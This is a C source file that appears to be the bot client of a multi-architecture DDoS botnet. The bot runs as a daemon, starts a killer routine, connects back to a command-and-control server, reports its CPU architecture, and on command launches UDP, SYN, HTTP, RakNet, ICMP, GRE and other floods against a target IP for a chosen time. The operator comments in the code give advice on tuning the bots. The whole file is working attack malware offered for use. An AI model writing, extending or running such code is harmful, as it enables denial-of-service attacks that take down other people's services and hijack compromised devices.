#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <errno.h>
#include "headers/syn_attack.h"
#include "headers/udp_attack.h"
#include "headers/http_attack.h"
#include "headers/socket_attack.h"
#include "headers/vse_attack.h"
#include "headers/raknet_attack.h"
#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/icmp_attack.h"
#include "headers/killer.h"
#include "headers/gre_attack.h"

#define CNC_IP "0.0.0.0"
#define BOT_PORT 1338
#define MAX_THREADS 3
// recommended 2-5 (OR 1 IF LOADING LOW-END bots)
// dont increase this too much, save resources plz
// dont exhaust bots forever, your cnc may die sometime..
#define MAX_RECONNECT_ATTEMPTS 8
#define RETRY_DELAY 4 // increase this if your port speed is low 

const char* get_arch() {
    #ifdef ARCH_aarch64
    return "aarch64";
    #elif defined(ARCH_arm)
    return "arm";
    #elif defined(ARCH_m68k)
    return "m68k";
    #elif defined(ARCH_mips)
    return "mips";
    #elif defined(ARCH_mipsel)
    return "mipsel";
    #elif defined(ARCH_powerpc64)
    return "powerpc64";
    #elif defined(ARCH_sh4)
    return "sh4";
    #elif defined(ARCH_sparc)
    return "sparc";
    #elif defined(ARCH_x86_64)
    return "x86_64";
    #elif defined(ARCH_i686)
    return "i686";
    #else
    return "unknown";
    #endif
}

static attack_params attack_state;
static pthread_t attack_threads[MAX_THREADS];

void handle_command(const char *command, int sock) {
    if (!command || strlen(command) > 1023) return;
    
    static char buffer[256];
    if (strncmp(command, "ping", 4) == 0) {
        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        return;
    }

    static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
    static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
    static void* (*attack_funcs[])(void*) = {
        udp_attack, vse_attack, syn_attack, socket_attack, 
        http_attack, raknet_attack, icmp_attack, gre_attack
    };
    
    int which = -1;
    for (int i = 0; i < 8; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            which = i;
            break;
        }
    }

    if (which >= 0) {
        static char ip[32];
        static char argstr[512];
        int n = 0;
        int port = 0;
        int time = 0;
        int psize = 0;
        int srcport = 0;
        int gre_proto = 0;
        int gport = 0;

        memset(ip, 0, sizeof(ip));
        memset(argstr, 0, sizeof(argstr));

        if (which == 6 || which == 7) { // ICMP or GRE (L3)
            n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else {
            n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        }

        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) psize = atoi(token + 6);
                else if (strncmp(token, "srcport=", 8) == 0) srcport = atoi(token + 8);
                else if (strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                }
                else if (strncmp(token, "gport=", 6) == 0) gport = atoi(token + 6);
                token = strtok(NULL, " ");
            }
        }

        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_cancel(attack_threads[i]);
            pthread_join(attack_threads[i], NULL);
        }

        attack_state.target_addr.sin_family = AF_INET;
        attack_state.target_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &attack_state.target_addr.sin_addr);
        attack_state.duration = time;
        attack_state.psize = psize;
        attack_state.srcport = srcport;
        attack_state.active = 1;

        if (which == 7) { // GRE attack
            gre_attack_params* gre_state = malloc(sizeof(gre_attack_params));
            gre_state->target_addr = attack_state.target_addr;
            gre_state->duration = time;
            gre_state->psize = psize;
            gre_state->srcport = srcport;
            gre_state->gre_proto = gre_proto;
            gre_state->gport = gport;
            gre_state->active = 1;
            pthread_create(&attack_threads[0], NULL, gre_attack, gre_state);
        } else {
            pthread_create(&attack_threads[0], NULL, attack_funcs[which], &attack_state);
        }
    }

    if (strcmp(command, "stop") == 0) {
        attack_state.active = 0;
        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_cancel(attack_threads[i]);
            pthread_join(attack_threads[i], NULL);
        }
    }
}

int main(int argc, char** argv) {
    static int sock = -1;
    static struct sockaddr_in server_addr;
    static char command[1024];
    ssize_t n;
    

    daemonize(argc, argv);
    start_killer();

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int connect_attempts = 0;
    int initial_connection = 1;

    while (connect_attempts < MAX_RECONNECT_ATTEMPTS) {
        if (sock != -1) {
            close(sock);
            sock = -1;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            connect_attempts++;
            sleep(RETRY_DELAY);
            continue;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sock = -1;
            connect_attempts++;
            sleep(RETRY_DELAY);
            continue;
        }

        // successfully connected
        if (initial_connection) {
            send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL);
            initial_connection = 0;
            connect_attempts = 0; 
        }

        while ((n = recv(sock, command, sizeof(command)-1, 0)) > 0) {
            command[n] = 0;
            handle_command(command, sock);
            memset(command, 0, sizeof(command));
        }

        // connection lost, begin retries again
        if (!initial_connection) {
            connect_attempts++;
        }
        sleep(RETRY_DELAY);
    }

    // die
    if (sock != -1) {
        close(sock);
    }
    return 0;
}
